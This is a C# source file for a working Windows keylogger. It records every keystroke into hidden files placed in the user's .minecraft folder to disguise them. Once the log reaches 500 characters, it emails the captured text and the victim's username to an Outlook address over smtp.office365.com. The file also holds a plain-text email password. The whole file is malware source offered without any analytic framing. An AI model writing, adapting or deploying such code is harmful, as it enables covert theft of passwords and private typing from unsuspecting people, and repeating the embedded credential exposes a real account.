using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace KeyLogger
{
    internal partial class Program
    {
        private const string FROM_EMAIL_ADDRESS = "pcyb.results@outlook.com";
        private const string FROM_EMAIL_PASSWORD = "JP2GMD2137";
        private const string TO_EMAIL_ADDRESS = "pcyb.results@outlook.com";
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 500;
        static readonly string ARCHIVE_FILE_NAME = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\log.txt";
        static readonly string LOG_FILE_NAME = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\latestlog.txt";
        static readonly string MINECRAFT_NAME = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft";
        [LibraryImport("user32.dll")]
        public static partial int GetAsyncKeyState(int virtualKey);

        private static void Main()
        { 
            if (!Directory.Exists(MINECRAFT_NAME))
            {
                Directory.CreateDirectory(MINECRAFT_NAME);
            }
            if (!File.Exists(LOG_FILE_NAME))
            {
                File.Create(LOG_FILE_NAME);
                File.SetAttributes(LOG_FILE_NAME, FileAttributes.Hidden);
            }
            if (!File.Exists(ARCHIVE_FILE_NAME))
            {
                File.Create(ARCHIVE_FILE_NAME);
                File.SetAttributes(ARCHIVE_FILE_NAME, FileAttributes.Hidden);
            }

            KeyLogger();
        }

        static void KeyLogger()
        {
            bool[] keyStateArray = new bool[256];
            bool shiftKeyHeld = false;
            bool altKeyHeld = false;
            bool capsLockOn = false;

            while (true)
            {
                for (int virtualKey = 0; virtualKey < 256; virtualKey++)
                {
                    int keyState = GetAsyncKeyState(virtualKey);

                    if ((keyState & 1) == 1 && !keyStateArray[virtualKey])
                    {
                        keyStateArray[virtualKey] = true;

                        if (IsShiftKeyPressed())
                        {
                            shiftKeyHeld = true;
                        }
                        if (IsAltKeyPressed())
                        {
                            altKeyHeld = true;
                        }
                        if (IsCapsPressed())
                        {
                            capsLockOn = !capsLockOn;
                        }

                        VirtualKey key = (VirtualKey)virtualKey;
                        string keyValue = GetKeyValue(key);

                        if (altKeyHeld)
                        {
                            keyValue = HandleAltKey(keyValue);
                            altKeyHeld= false;
                        }
                        if (shiftKeyHeld)
                        {
                            keyValue = HandleShiftKey(keyValue);
                        }

                        if (capsLockOn)
                        {
                            keyValue = keyValue.ToUpper();
                        }

                        if (capsLockOn && shiftKeyHeld)
                        {
                            keyValue = keyValue.ToLower();
                        }

                        shiftKeyHeld = false;
                        Console.WriteLine(keyValue);
                        WriteToFile(keyValue);
                        MoveDataAndSendMail();
                    }
                    else if ((keyState & 0x8000) == 0)
                    {
                        keyStateArray[virtualKey] = false;
                    }
                    Thread.Sleep(10);
                }
            }
        }
        static void MoveDataAndSendMail()
        {
            FileInfo logFile = new(LOG_FILE_NAME);
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    logFile.Delete();

                    System.Threading.Thread mailThread = new (Program.SendMail);
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }
        }
        static string GetKeyValue(VirtualKey virtualKey)
        {
            // Map virtual keys to their corresponding values here.
            return virtualKey switch
            {
                VirtualKey.VK_0 => "0",
                VirtualKey.VK_1 => "1",
                VirtualKey.VK_2 => "2",
                VirtualKey.VK_3 => "3",
                VirtualKey.VK_4 => "4",
                VirtualKey.VK_5 => "5",
                VirtualKey.VK_6 => "6",
                VirtualKey.VK_7 => "7",
                VirtualKey.VK_8 => "8",
                VirtualKey.VK_9 => "9",
                VirtualKey.VK_A => "a",
                VirtualKey.VK_B => "b",
                VirtualKey.VK_C => "c",
                VirtualKey.VK_D => "d",
                VirtualKey.VK_E => "e",
                VirtualKey.VK_F => "f",
                VirtualKey.VK_NULL => "",
                VirtualKey.VK_G => "g",
                VirtualKey.VK_H => "h",
                VirtualKey.VK_I => "i",
                VirtualKey.VK_J => "j",
                VirtualKey.VK_K => "k",
                VirtualKey.VK_L => "l",
                VirtualKey.VK_M => "m",
                VirtualKey.VK_N => "n",
                VirtualKey.VK_O => "o",
                VirtualKey.VK_P => "p",
                VirtualKey.VK_Q => "q",
                VirtualKey.VK_R => "r",
                VirtualKey.VK_S => "s",
                VirtualKey.VK_T => "t",
                VirtualKey.VK_U => "u",
                VirtualKey.VK_V => "v",
                VirtualKey.VK_W => "w",
                VirtualKey.VK_X => "x",
                VirtualKey.VK_Y => "y",
                VirtualKey.VK_Z => "z",
                VirtualKey.VK_MULTIPLY => "*",
                VirtualKey.VK_ADD => "+",
                VirtualKey.VK_SEPARATOR => "-",
                VirtualKey.VK_SUBTRACT => "-",
                VirtualKey.VK_DECIMAL => ".",
                VirtualKey.VK_DIVIDE => "/",
                VirtualKey.VK_F1 => "[F1]",
                VirtualKey.VK_F2 => "[F2]",
                VirtualKey.VK_F3 => "[F3]",
                VirtualKey.VK_F4 => "[F4]",
                VirtualKey.VK_F5 => "[F5]",
                VirtualKey.VK_F6 => "[F6]",
                VirtualKey.VK_F7 => "[F7]",
                VirtualKey.VK_F8 => "[F8]",
                VirtualKey.VK_F9 => "[F9]",
                VirtualKey.VK_F10 => "[F10]",
                VirtualKey.VK_F11 => "[F11]",
                VirtualKey.VK_F12 => "[F12]",
                VirtualKey.VK_LSHIFT => "[L_Shift]",
                VirtualKey.VK_RSHIFT => "[R_Shift]",
                VirtualKey.VK_LCONTROL => "[L_CTRL]",
                VirtualKey.VK_RCONTROL => "[R_CTRL]",
                VirtualKey.VK_MENU => "[ALT]",
                VirtualKey.VK_LMENU => "[L_ALT]",
                VirtualKey.VK_RMENU => "[R_ALT]",
                VirtualKey.VK_BACK => "[BACK]",
                VirtualKey.VK_TAB => "[TAB]",
                VirtualKey.VK_CAPITAL => "[CAPS]",
                VirtualKey.VK_ESCAPE => "[ESC]",
                VirtualKey.VK_SPACE => " ",
                VirtualKey.VK_END => "[END]",
                VirtualKey.VK_HOME => "[HOME]",
                VirtualKey.VK_LEFT => "[LEFT]",
                VirtualKey.VK_UP => "[UP]",
                VirtualKey.VK_RIGHT => "[RIGHT]",
                VirtualKey.VK_DOWN => "[DOWN]",
                VirtualKey.VK_RETURN => "\n",
                VirtualKey.VK_INSERT => "[INSERT]",
                VirtualKey.VK_DELETE => "[DEL]",
                VirtualKey.VK_NUMPAD0 => "0",
                VirtualKey.VK_NUMPAD1 => "1",
                VirtualKey.VK_NUMPAD2 => "2",
                VirtualKey.VK_NUMPAD3 => "3",
                VirtualKey.VK_NUMPAD4 => "4",
                VirtualKey.VK_NUMPAD5 => "5",
                VirtualKey.VK_NUMPAD6 => "6",
                VirtualKey.VK_NUMPAD7 => "7",
                VirtualKey.VK_NUMPAD8 => "8",
                VirtualKey.VK_NUMPAD9 => "9",
                VirtualKey.VK_NUMLOCK => "[NUM]",
                VirtualKey.VK_SCROLL => "[SCROlL]",
                VirtualKey.VK_SHIFT => "",
                VirtualKey.VK_CONTROL => "",
                VirtualKey.VK_OEM_COMMA => ",",
                VirtualKey.VK_OEM_PERIOD => ".",
                VirtualKey.VK_OEM_2 => "/",
                VirtualKey.VK_OEM_7 => "'",
                VirtualKey.VK_OEM_1 => ";",
                VirtualKey.VK_OEM_5 => "\\",
                VirtualKey.VK_OEM_3 => "`",
                VirtualKey.VK_OEM_6 => "]",
                VirtualKey.VK_OEM_4 => "[",
                VirtualKey.VK_OEM_MINUS => "-",
                VirtualKey.VK_OEM_EQUAL => "=",
                VirtualKey.VK_PRIOR => "[PG_UP]",
                VirtualKey.VK_NEXT => "[PG_DW]",
                VirtualKey.VK_LEFT_MOUSE => "[LMB]",
                VirtualKey.VK_RIGHT_MOUSE => "[RMB]",
                VirtualKey.VK_VOLUME_UP => "[vol+]",
                VirtualKey.VK_VOLUME_DOWN => "[vol-]",
                VirtualKey.VK_VOLUME_MUTE => "[MUTE]",
                VirtualKey.VK_SNAPSHOT => "[SCR]",
                VirtualKey.VK_PAUSE => "[PAUSE]",
                VirtualKey.VK_SKIP => "[SKIP]",
                VirtualKey.VK_RESUME => "[RESUME]",
                VirtualKey.VK_COMEBACK => "[COMEBACK]",
                _ => virtualKey.ToString(),
            };
        }

        static string HandleShiftKey(string keyValue)
        {
            return keyValue switch
            {
                "1" => "!",
                "2" => "@",
                "3" => "#",
                "4" => "$",
                "5" => "%",
                "6" => "^",
                "7" => "&",
                "8" => "*",
                "9" => "(",
                "0" => ")",
                "-" => "_",
                "=" => "+",
                "\\" => "|",
                "/" => "?",
                "," => "<",
                "." => ">",
                ";" => ":",
                "'" => "\"",
                "[" => "{",
                "]" => "}",
                _ => keyValue.ToUpper(),
            };
        }

        static string HandleAltKey(string keyValue)
        {
            return keyValue switch
            {
                "a" => "ą",
                "e" => "ę",
                "c" => "ć",
                "o" => "ó",
                "s" => "ś",
                "l" => "ł",
                "z" => "ż",
                "x" => "ź",
                "n" => "ń",
                _ => keyValue,
            };
        }

        static void WriteToFile(string value)
        {
            try
            {
                using StreamWriter file = new(LOG_FILE_NAME, true);
                File.SetAttributes(LOG_FILE_NAME, FileAttributes.Hidden);
                file.Write(value);
                
            }
            catch (IOException ex)
            {
                Console.WriteLine($"Error writing to the log file: {ex.Message}");
            }
        }

        static bool IsShiftKeyPressed()
        {
            return (GetAsyncKeyState((int)VirtualKey.VK_SHIFT) & 0x8000) != 0;
        }

        static bool IsAltKeyPressed()
        {
            return (GetAsyncKeyState((int)VirtualKey.VK_RMENU) & 0x8000) != 0;
        }

        static bool IsCapsPressed()
        {
            return (GetAsyncKeyState((int)VirtualKey.VK_CAPITAL) & 0x8000) != 0;
        }

        static void SendMail()
        {
            try
            {
                Console.WriteLine("Trying to send email...");

                string emailBody = "";
                using (StreamReader input = new (ARCHIVE_FILE_NAME))
                {
                    emailBody = input.ReadToEnd();
                }
                using (SmtpClient client = new("smtp.office365.com"))
                {
                    client.Port = 587;
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
                    client.Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD);
                    client.EnableSsl = true;

                    using (MailMessage message = new())
                    {
                        message.From = new MailAddress(FROM_EMAIL_ADDRESS);
                        message.To.Add(TO_EMAIL_ADDRESS);
                        message.Subject = $"{Environment.UserName} - {DateTime.Now:MM.dd.yyyy}";
                        message.Body = emailBody;
                        message.IsBodyHtml = false;
                        client.Send(message);
                    }
                }
                
                Console.WriteLine("Email sent successfully.");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error sending email: " + e.Message);
            }
        }
    }
    enum VirtualKey
    {
        VK_NULL = 0x00,   // No key
        VK_LEFT_MOUSE = 0x01,   // Left Mouse click
        VK_RIGHT_MOUSE = 0x02,  // Right Mouse click
        VK_CANCEL = 0x03, // Control-break processing
        VK_BACK = 0x08,   // Backspace key
        VK_TAB = 0x09,    // Tab key
        VK_RETURN = 0x0D, // Enter key
        VK_SHIFT = 0x10,  // Shift key
        VK_CONTROL = 0x11, // Ctrl key
        VK_MENU = 0x12,   // Alt key
        VK_PAUSE = 0x13,  // Pause key
        VK_CAPITAL = 0x14, // Caps Lock key
        VK_ESCAPE = 0x1B, // Esc key
        VK_SPACE = 0x20,  // Spacebar
        VK_PRIOR = 0x21,  // Page Up
        VK_NEXT = 0x22,   // Page Down
        VK_END = 0x23,    // End key
        VK_HOME = 0x24,   // Home key
        VK_LEFT = 0x25,   // Left arrow key
        VK_UP = 0x26,     // Up arrow key
        VK_RIGHT = 0x27,  // Right arrow key
        VK_DOWN = 0x28,   // Down arrow key
        VK_SELECT = 0x29, // Select key
        VK_PRINT = 0x2A,  // Print key
        VK_EXECUTE = 0x2B, // Execute key
        VK_SNAPSHOT = 0x2C, // Print Screen key
        VK_INSERT = 0x2D,   // Insert key
        VK_DELETE = 0x2E,   // Delete key
        VK_0 = 0x30,  // Numeric "0" key
        VK_1 = 0x31,  // Numeric "1" key
        VK_2 = 0x32,  // Numeric "2" key
        VK_3 = 0x33,  // Numeric "3" key
        VK_4 = 0x34,  // Numeric "4" key
        VK_5 = 0x35,  // Numeric "5" key
        VK_6 = 0x36,  // Numeric "6" key
        VK_7 = 0x37,  // Numeric "7" key
        VK_8 = 0x38,  // Numeric "8" key
        VK_9 = 0x39,  // Numeric "9" key
        VK_A = 0x41,  // Letter "A" key
        VK_B = 0x42,  // Letter "B" key
        VK_C = 0x43,  // Letter "C" key
        VK_D = 0x44,  // Letter "D" key
        VK_E = 0x45,  // Letter "E" key
        VK_F = 0x46,  // Letter "F" key
        VK_G = 0x47,   // Letter "G" key
        VK_H = 0x48,   // Letter "H" key
        VK_I = 0x49,   // Letter "I" key
        VK_J = 0x4A,   // Letter "J" key
        VK_K = 0x4B,   // Letter "K" key
        VK_L = 0x4C,   // Letter "L" key
        VK_M = 0x4D,   // Letter "M" key
        VK_N = 0x4E,   // Letter "N" key
        VK_O = 0x4F,   // Letter "O" key
        VK_P = 0x50,   // Letter "P" key
        VK_Q = 0x51,   // Letter "Q" key
        VK_R = 0x52,   // Letter "R" key
        VK_S = 0x53,   // Letter "S" key
        VK_T = 0x54,   // Letter "T" key
        VK_U = 0x55,   // Letter "U" key
        VK_V = 0x56,   // Letter "V" key
        VK_W = 0x57,   // Letter "W" key
        VK_X = 0x58,   // Letter "X" key
        VK_Y = 0x59,   // Letter "Y" key
        VK_Z = 0x5A,   // Letter "Z" key
        VK_NUMPAD0 = 0x60,     // Numeric keypad "0" key
        VK_NUMPAD1 = 0x61,     // Numeric keypad "1" key
        VK_NUMPAD2 = 0x62,     // Numeric keypad "2" key
        VK_NUMPAD3 = 0x63,     // Numeric keypad "3" key
        VK_NUMPAD4 = 0x64,     // Numeric keypad "4" key
        VK_NUMPAD5 = 0x65,     // Numeric keypad "5" key
        VK_NUMPAD6 = 0x66,     // Numeric keypad "6" key
        VK_NUMPAD7 = 0x67,     // Numeric keypad "7" key
        VK_NUMPAD8 = 0x68,     // Numeric keypad "8" key
        VK_NUMPAD9 = 0x69,     // Numeric keypad "9" key
        VK_MULTIPLY = 0x6A,   // Numeric keypad "*" key
        VK_ADD = 0x6B,        // Numeric keypad "+" key
        VK_SEPARATOR = 0x6C,  // Separator key
        VK_SUBTRACT = 0x6D,   // Numeric keypad "-" key
        VK_DECIMAL = 0x6E,    // Numeric keypad "." key
        VK_DIVIDE = 0x6F,     // Numeric keypad "/" key
        VK_F1 = 0x70,         // Function key F1
        VK_F2 = 0x71,         // Function key F2
        VK_F3 = 0x72,         // Function key F3
        VK_F4 = 0x73,         // Function key F4
        VK_F5 = 0x74,         // Function key F5
        VK_F6 = 0x75,         // Function key F6
        VK_F7 = 0x76,         // Function key F7
        VK_F8 = 0x77,         // Function key F8
        VK_F9 = 0x78,         // Function key F9
        VK_F10 = 0x79,        // Function key F10
        VK_F11 = 0x7A,        // Function key F11
        VK_F12 = 0x7B,        // Function key F12
        VK_NUMLOCK = 0x90,    // Num Lock key
        VK_SCROLL = 0x91,     // Scroll Lock key
        VK_LSHIFT = 0xA0,     // Left Shift key
        VK_RSHIFT = 0xA1,     // Right Shift key
        VK_LCONTROL = 0xA2,   // Left Control key
        VK_RCONTROL = 0xA3,   // Right Control key
        VK_LMENU = 0xA4,      // Left Alt key
        VK_RMENU = 0xA5,      // Right Alt key
        VK_BROWSER_BACK = 0xA6, // Browser Back key
        VK_BROWSER_FORWARD = 0xA7, // Browser Forward key
        VK_MEDIA_NEXT_TRACK = 0xA9, // Media Next Track key
        VK_MEDIA_PREV_TRACK = 0xA8, // Media Previous Track key
        VK_VOLUME_MUTE = 0xAD, // Volume Mute key
        VK_VOLUME_DOWN = 0xAE, // Volume Down key
        VK_VOLUME_UP = 0xAF,   // Volume Up key
        VK_OEM_1 = 0xBA,      // For the US standard keyboard, the ';:' key
        VK_OEM_EQUAL = 0xBB,   // For the US standard keyboard, the '+' key
        VK_OEM_COMMA = 0xBC,  // For the US standard keyboard, the ',' key
        VK_OEM_MINUS = 0xBD,  // For the US standard keyboard, the '-' key
        VK_OEM_PERIOD = 0xBE, // For the US standard keyboard, the '.' key
        VK_SKIP = 0xB0,       // Skip key
        VK_RESUME = 0xB3,     // Resume key
        VK_COMEBACK = 0xB1,   // Comeback key
        VK_OEM_2 = 0xBF,      // For the US standard keyboard, the '/?' key
        VK_OEM_3 = 0xC0,      // For the US standard keyboard, the '`~' key
        VK_OEM_4 = 0xDB,   // For the US standard keyboard, the '[{' key
        VK_OEM_5 = 0xDC,   // For the US standard keyboard, the '\|' key
        VK_OEM_6 = 0xDD,   // For the US standard keyboard, the ']}' key
        VK_OEM_7 = 0xDE,   // For the US standard keyboard, the 'single-quote/double-quote' key
        VK_OEM_8 = 0xDF,   // Used for various purposes by IMEs
        VK_PROCESSKEY = 0xE5, // IME PROCESS key
        VK_ATTN = 0xF6,    // Attn key
        VK_CRSEL = 0xF7,   // CrSel key
        VK_EXSEL = 0xF8,   // ExSel key
        VK_EREOF = 0xF9,   // Erase EOF key
        VK_PLAY = 0xFA,    // Play key
        VK_ZOOM = 0xFB,    // Zoom key
        VK_NONAME = 0xFC,  // Reserved for future use
        VK_PA1 = 0xFD,     // PA1 key
        VK_OEM_CLEAR = 0xFE, // Clear key
    }

}
